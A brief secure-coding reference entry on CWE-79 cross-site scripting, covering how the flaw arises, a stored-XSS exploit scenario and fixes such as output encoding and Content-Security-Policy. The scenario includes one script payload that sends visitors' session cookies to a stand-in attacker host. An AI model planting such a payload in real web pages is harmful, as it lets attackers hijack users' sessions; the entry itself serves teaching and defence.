# CWE-79 — Cross-Site Scripting (XSS)

CWE ID: CWE-79
OWASP: A03:2021 Injection

## Description
Untrusted input is placed into web output without proper encoding, so a victim's browser executes attacker script.

## How it appears in code
Rendering `request.query` into HTML unescaped; `innerHTML = userInput`; templates with autoescape disabled.

## Exploit scenario
A comment field stores `<script>fetch('//evil/?c='+document.cookie)</script>`; every viewer's session cookie is exfiltrated (stored XSS).

## Fix
Context-aware output encoding; enable template autoescaping; sanitize HTML; set a strict Content-Security-Policy; avoid `innerHTML` with user data.
